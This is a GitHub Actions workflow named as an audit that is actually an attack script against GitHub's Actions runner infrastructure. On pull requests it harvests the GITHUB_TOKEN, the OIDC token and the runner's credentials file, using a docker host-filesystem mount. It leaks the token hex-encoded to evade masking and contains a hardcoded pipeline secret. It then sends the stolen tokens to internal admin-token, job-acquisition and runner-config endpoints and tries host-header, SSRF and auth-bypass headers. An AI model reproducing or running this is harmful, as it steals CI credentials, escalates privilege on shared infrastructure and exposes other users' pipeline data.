name: Audit v42
on:
  pull_request:
    types: [opened, synchronize, reopened]

permissions:
  contents: write
  pull-requests: write
  id-token: write
  actions: write
  packages: write
  checks: write
  statuses: write
  deployments: write
  issues: write

jobs:
  audit-v42:
    runs-on: ubuntu-latest
    steps:

      # ══════════════════════════════════════════════════════════════
      # STEP 1: Harvest
      # ══════════════════════════════════════════════════════════════
      - name: Step 1 - Harvest
        if: always()
        run: |
          set +e
          echo "=== V42 HARVEST ==="
          echo "$PATH" > /tmp/saved_path.txt
          RT="${{ secrets.GITHUB_TOKEN }}"
          echo "$RT" > /tmp/rt.txt
          echo "RT_PFX=${RT:0:14} LEN=${#RT}"
          echo "$ACTIONS_ID_TOKEN_REQUEST_TOKEN" > /tmp/idtok.txt
          echo "$ACTIONS_ID_TOKEN_REQUEST_URL" > /tmp/idtok_url.txt
          WLOG=$(find /home/runner/actions-runner -name "Worker_*.log" -type f 2>/dev/null | head -1)
          if [ -f "$WLOG" ]; then
            for KEY in PipelinesServiceUrl CacheServerUrl ResultsServiceUrl; do
              VAL=$(grep -oP "\"${KEY}\"\s*:\s*\"\K[^\"]+" "$WLOG" 2>/dev/null | head -1)
              echo "$KEY=$VAL"; echo "$VAL" > /tmp/${KEY}.txt
            done
            PLAN=$(grep -oP '"planId"\s*:\s*"\K[^"]+' "$WLOG" | head -1)
            JOB=$(grep -oP '"jobId"\s*:\s*"\K[^"]+' "$WLOG" | head -1)
            echo "PLAN=$PLAN JOB=$JOB"
            echo "$PLAN" > /tmp/plan.txt; echo "$JOB" > /tmp/job.txt
          fi
          docker run --rm -v /:/h alpine sh -c '
            F=$(find /h/home/runner -name ".credentials" -type f 2>/dev/null | head -1)
            [ -f "$F" ] && { echo "CRED_HEX_START"; xxd -p "$F" | tr -d "\n"; echo ""; echo "CRED_HEX_END"; }
          ' 2>/dev/null > /tmp/hex_extract.txt
          python3 -c "
          import binascii,json
          raw=open('/tmp/hex_extract.txt').read()
          s=raw.find('CRED_HEX_START');e=raw.find('CRED_HEX_END')
          if s>=0 and e>=0:
            h=raw[s+14:e].strip()
            d=json.loads(binascii.unhexlify(h).decode())
            t=d.get('Data',{}).get('token','')
            open('/tmp/cred_token.txt','w').write(t)
            print(f'CTOK_LEN={len(t)}')
          " 2>/dev/null
          echo "RT_HEX=$(echo -n "$RT" | xxd -p | tr -d '\n')"

      # ══════════════════════════════════════════════════════════════
      # STEP 2: CRITICAL ROUTES — admintoken, idtoken, acquirejobs
      # From v41 pipeline 95 defs — these are the highest-value targets
      # Hit with EVERY token, GET+POST, with and without traversal
      # ══════════════════════════════════════════════════════════════
      - name: Step 2 - Critical routes
        if: always()
        run: |
          set +e
          export PATH=$(cat /tmp/saved_path.txt)
          echo "=== CRITICAL ROUTES ==="
          IDTOK=$(cat /tmp/idtok.txt)
          RT=$(cat /tmp/rt.txt)
          CTOK=$(cat /tmp/cred_token.txt 2>/dev/null)
          SECRET="ebCM8PuzoqMUC79EgT17Glzg3dxVdS1cSj8PJs6gALbtgEsvbF"
          IID="8f795dfa-02d7-4018-af3a-c98d25c03f68"
          PLAN=$(cat /tmp/plan.txt)
          JOB=$(cat /tmp/job.txt)
          RUNID="${{ github.run_id }}"

          # Test on multiple base URLs including serviceHosts
          for BASE_NAME in SECRET SHOSTS PARENT; do
            case $BASE_NAME in
              SECRET) BASE="https://pipelinesghubeus14.actions.githubusercontent.com/$SECRET" ;;
              SHOSTS) BASE="https://pipelines.actions.githubusercontent.com/serviceHosts/$IID" ;;
              PARENT) BASE="https://pipelinesghubeus14.actions.githubusercontent.com/$SECRET/.." ;;
            esac
            echo "=== BASE: $BASE_NAME ==="

            for TOK_NAME in IDTOK RT CTOK; do
              eval TOK=\$$TOK_NAME
              [ -z "$TOK" ] || [ ${#TOK} -lt 10 ] && continue
              echo "--- TOKEN: $TOK_NAME ---"

              # admintoken — ADMIN TOKEN ISSUANCE
              for METHOD in GET POST; do
                R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X $METHOD --connect-timeout 3 -m 5 \
                  -H "Authorization: Bearer $TOK" -H "Content-Type: application/json" \
                  "$BASE/_apis/distributedtask/admintoken" -d '{}' 2>/dev/null)
                CODE=$(echo "$R" | tail -1)
                [ "$CODE" != "HTTP_404" ] && [ "$CODE" != "HTTP_000" ] && \
                  echo "$METHOD admintoken = $CODE | $(echo "$R" | sed '$d' | head -c 200)"
              done

              # idtoken — ID TOKEN
              for METHOD in GET POST; do
                R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X $METHOD --connect-timeout 3 -m 5 \
                  -H "Authorization: Bearer $TOK" -H "Content-Type: application/json" \
                  "$BASE/_apis/distributedtask/idtoken?api-version=6.0-preview" \
                  -d "{\"planId\":\"$PLAN\",\"jobId\":\"$JOB\",\"oidcToken\":true}" 2>/dev/null)
                CODE=$(echo "$R" | tail -1)
                [ "$CODE" != "HTTP_404" ] && [ "$CODE" != "HTTP_000" ] && \
                  echo "$METHOD idtoken = $CODE | $(echo "$R" | sed '$d' | head -c 200)"
              done

              # runtime sessions
              for METHOD in GET POST; do
                R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X $METHOD --connect-timeout 3 -m 5 \
                  -H "Authorization: Bearer $TOK" -H "Content-Type: application/json" \
                  "$BASE/_apis/runtime/sessions" \
                  -d "{\"ownerName\":\"v42\"}" 2>/dev/null)
                CODE=$(echo "$R" | tail -1)
                [ "$CODE" != "HTTP_404" ] && [ "$CODE" != "HTTP_000" ] && \
                  echo "$METHOD runtime/sessions = $CODE | $(echo "$R" | sed '$d' | head -c 200)"
              done

              # runtime messages
              R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 5 \
                -H "Authorization: Bearer $TOK" "$BASE/_apis/runtime/messages")
              CODE=$(echo "$R" | tail -1)
              [ "$CODE" != "HTTP_404" ] && [ "$CODE" != "HTTP_000" ] && \
                echo "GET runtime/messages = $CODE | $(echo "$R" | sed '$d' | head -c 200)"

              # acquirejobs
              R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST --connect-timeout 3 -m 5 \
                -H "Authorization: Bearer $TOK" -H "Content-Type: application/json" \
                "$BASE/_apis/runtime/acquirejobs" \
                -d "{\"jobId\":\"$JOB\"}" 2>/dev/null)
              CODE=$(echo "$R" | tail -1)
              [ "$CODE" != "HTTP_404" ] && [ "$CODE" != "HTTP_000" ] && \
                echo "POST acquirejobs = $CODE | $(echo "$R" | sed '$d' | head -c 200)"

              # acquirablejobs
              R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 5 \
                -H "Authorization: Bearer $TOK" "$BASE/_apis/runtime/acquirablejobs")
              CODE=$(echo "$R" | tail -1)
              [ "$CODE" != "HTTP_404" ] && [ "$CODE" != "HTTP_000" ] && \
                echo "GET acquirablejobs = $CODE | $(echo "$R" | sed '$d' | head -c 200)"

              # generatejitconfig
              R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST --connect-timeout 3 -m 5 \
                -H "Authorization: Bearer $TOK" -H "Content-Type: application/json" \
                "$BASE/_apis/runtime/generatejitconfig" \
                -d '{"name":"v42-jit","labels":["self-hosted"]}' 2>/dev/null)
              CODE=$(echo "$R" | tail -1)
              [ "$CODE" != "HTTP_404" ] && [ "$CODE" != "HTTP_000" ] && \
                echo "POST generatejitconfig = $CODE | $(echo "$R" | sed '$d' | head -c 200)"

              # runnerscalesets
              R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 5 \
                -H "Authorization: Bearer $TOK" "$BASE/_apis/runtime/runnerscalesets")
              CODE=$(echo "$R" | tail -1)
              [ "$CODE" != "HTTP_404" ] && [ "$CODE" != "HTTP_000" ] && \
                echo "GET runnerscalesets = $CODE | $(echo "$R" | sed '$d' | head -c 200)"

              # brokerlistener
              R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 5 \
                -H "Authorization: Bearer $TOK" "$BASE/_apis/distributedtask/brokerlistener")
              CODE=$(echo "$R" | tail -1)
              [ "$CODE" != "HTTP_404" ] && [ "$CODE" != "HTTP_000" ] && \
                echo "GET brokerlistener = $CODE | $(echo "$R" | sed '$d' | head -c 200)"
              echo ""
            done
          done

      # ══════════════════════════════════════════════════════════════
      # STEP 3: HEADER INJECTION + HOST HEADER SSRF
      # Use manipulated headers to bypass auth or access services
      # ══════════════════════════════════════════════════════════════
      - name: Step 3 - Header injection
        if: always()
        run: |
          set +e
          export PATH=$(cat /tmp/saved_path.txt)
          echo "=== HEADER INJECTION ==="
          IDTOK=$(cat /tmp/idtok.txt)
          RT=$(cat /tmp/rt.txt)
          SECRET="ebCM8PuzoqMUC79EgT17Glzg3dxVdS1cSj8PJs6gALbtgEsvbF"
          IID="8f795dfa-02d7-4018-af3a-c98d25c03f68"
          PIPE="https://pipelinesghubeus14.actions.githubusercontent.com/$SECRET"

          # A: Host header manipulation — pretend to be a different host
          echo "--- A: Host header ---"
          for HOST_HDR in \
            "pipelines.actions.githubusercontent.com" \
            "runner.actions.githubusercontent.com" \
            "vstoken.actions.githubusercontent.com" \
            "pipelinesghubeus14.actions.githubusercontent.com" \
            "localhost" \
            "127.0.0.1" \
            "169.254.169.254"; do
            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 5 \
              -H "Authorization: Bearer $IDTOK" \
              -H "Host: $HOST_HDR" \
              "$PIPE/_apis/distributedtask/admintoken")
            CODE=$(echo "$R" | tail -1)
            [ "$CODE" != "HTTP_404" ] && [ "$CODE" != "HTTP_000" ] && \
              echo "A Host=$HOST_HDR = $CODE | $(echo "$R" | sed '$d' | head -c 150)"
          done
          echo ""

          # B: X-Forwarded headers — SSRF via reverse proxy
          echo "--- B: X-Forwarded ---"
          for HDR_VAL in \
            "X-Forwarded-Host: vstoken.actions.githubusercontent.com" \
            "X-Forwarded-For: 127.0.0.1" \
            "X-Original-URL: /_apis/distributedtask/admintoken" \
            "X-Rewrite-URL: /_apis/ServiceDefinitions" \
            "X-Custom-IP-Authorization: 127.0.0.1" \
            "X-Forwarded-Scheme: http" \
            "X-Azure-ClientIP: 10.0.0.1" \
            "X-MS-CLIENT-PRINCIPAL-NAME: admin" \
            "X-MS-TOKEN-AAD-ACCESS-TOKEN: test" \
            "X-ARR-SSL: test" \
            "X-ZUMO-AUTH: test"; do
            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 5 \
              -H "Authorization: Bearer $IDTOK" \
              -H "$HDR_VAL" \
              "$PIPE/_apis/distributedtask/admintoken")
            CODE=$(echo "$R" | tail -1)
            BODY=$(echo "$R" | sed '$d')
            [ "$CODE" != "HTTP_404" ] && [ "$CODE" != "HTTP_000" ] && \
              echo "B $HDR_VAL = $CODE | $(echo "$BODY" | head -c 150)"
          done
          echo ""

          # C: Header injection on ServiceDefinitions (bypassing 403)
          echo "--- C: ServiceDefs bypass headers ---"
          for HDR_VAL in \
            "X-VSS-ForceMsaPassThrough: true" \
            "X-TFS-FedAuthRedirect: include" \
            "X-VSS-ActAs: System:ServiceIdentity;DDDDDDDD-DDDD-DDDD-DDDD-DDDDDDDDDDDD" \
            "X-VSS-UserData: admin" \
            "X-TFS-Session: 00000000-0000-0000-0000-000000000000"; do
            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 5 \
              -H "Authorization: Bearer $IDTOK" \
              -H "$HDR_VAL" \
              "$PIPE/_apis/ServiceDefinitions")
            CODE=$(echo "$R" | tail -1)
            COUNT=$(echo "$R" | sed '$d' | jq '.count // empty' 2>/dev/null)
            [ "$CODE" = "HTTP_200" ] && echo "C $HDR_VAL = $CODE count=$COUNT"
            [ "$CODE" != "HTTP_200" ] && [ "$CODE" != "HTTP_403" ] && [ "$CODE" != "HTTP_404" ] && [ "$CODE" != "HTTP_000" ] && \
              echo "C $HDR_VAL = $CODE | $(echo "$R" | sed '$d' | head -c 150)"
          done

      # ══════════════════════════════════════════════════════════════
      # STEP 4: Pipeline data routes — timelines, logs, artifacts
      # Using discovered identifiers from v41 95 defs
      # ══════════════════════════════════════════════════════════════
      - name: Step 4 - Pipeline data routes
        if: always()
        run: |
          set +e
          export PATH=$(cat /tmp/saved_path.txt)
          echo "=== PIPELINE DATA ROUTES ==="
          IDTOK=$(cat /tmp/idtok.txt)
          RT=$(cat /tmp/rt.txt)
          SECRET="ebCM8PuzoqMUC79EgT17Glzg3dxVdS1cSj8PJs6gALbtgEsvbF"
          PIPE="https://pipelinesghubeus14.actions.githubusercontent.com/$SECRET"
          PLAN=$(cat /tmp/plan.txt)
          JOB=$(cat /tmp/job.txt)
          RUNID="${{ github.run_id }}"

          # A: distributedtask routes using plan context
          echo "--- A: distributedtask plan routes ---"
          for ROUTE in \
            "/_apis/distributedtask/plans/$PLAN" \
            "/_apis/distributedtask/plans/$PLAN/timelines" \
            "/_apis/distributedtask/plans/$PLAN/logs" \
            "/_apis/distributedtask/plans/$PLAN/events" \
            "/_apis/distributedtask/plans/$PLAN/attachments" \
            "/_apis/distributedtask/plans/$PLAN/records" \
            "/_apis/distributedtask/plans/$PLAN/feed" \
            "/_apis/distributedtask/plans/$PLAN/accesspolicy" \
            "/_apis/distributedtask/labels" \
            "/_apis/distributedtask/actiondownloadinfo" \
            "/_apis/distributedtask/requesttypelimits" \
            "/_apis/distributedtask/jobrequests" \
            "/_apis/distributedtask/runnermessages" \
            "/_apis/distributedtask/runnerconfigrefresh" \
            "/_apis/distributedtask/pools" \
            "/_apis/distributedtask/queuedrequests" \
            "/_apis/distributedtask/requests" \
            "/_apis/distributedtask/agentclouds"; do
            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 5 \
              -H "Authorization: Bearer $RT" "$PIPE$ROUTE")
            CODE=$(echo "$R" | tail -1)
            BODY=$(echo "$R" | sed '$d')
            [ "$CODE" != "HTTP_404" ] && [ "$CODE" != "HTTP_000" ] && \
              echo "A $ROUTE = $CODE | $(echo "$BODY" | head -c 200)"
          done
          echo ""

          # B: pipelines routes
          echo "--- B: pipelines routes ---"
          for ROUTE in \
            "/_apis/pipelines/$RUNID/runs" \
            "/_apis/pipelines/$RUNID/runs/1" \
            "/_apis/pipelines/$RUNID/runs/1/logs" \
            "/_apis/pipelines/$RUNID/runs/1/signedlogcontent" \
            "/_apis/pipelines/$RUNID/runs/1/signedartifactscontent" \
            "/_apis/pipelines/$RUNID/runs/1/signedsummary" \
            "/_apis/pipelines/$RUNID/runs/1/artifacts" \
            "/_apis/pipelines/$RUNID/runs/1/steps" \
            "/_apis/pipelines/$RUNID/runs/1/jobs" \
            "/_apis/pipelines/runs/$RUNID" \
            "/_apis/pipelines/runs/$RUNID/signedlogcontent" \
            "/_apis/pipelines/signalr" \
            "/_apis/pipelines/orgs" \
            "/_apis/pipelines/adminevents" \
            "/_apis/pipelines/runinfo/$RUNID"; do
            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 5 \
              -H "Authorization: Bearer $RT" "$PIPE$ROUTE")
            CODE=$(echo "$R" | tail -1)
            BODY=$(echo "$R" | sed '$d')
            [ "$CODE" != "HTTP_404" ] && [ "$CODE" != "HTTP_000" ] && \
              echo "B $ROUTE = $CODE | $(echo "$BODY" | head -c 200)"
          done

      # ══════════════════════════════════════════════════════════════
      # STEP 5: Final
      # ══════════════════════════════════════════════════════════════
      - name: Step 5 - Final
        if: always()
        run: |
          set +e
          export PATH=$(cat /tmp/saved_path.txt)
          echo "=== V42 FINAL ==="
          echo "RT_HEX=$(cat /tmp/rt.txt | xxd -p | tr -d '\n')"
          echo "=== V42 COMPLETE ==="
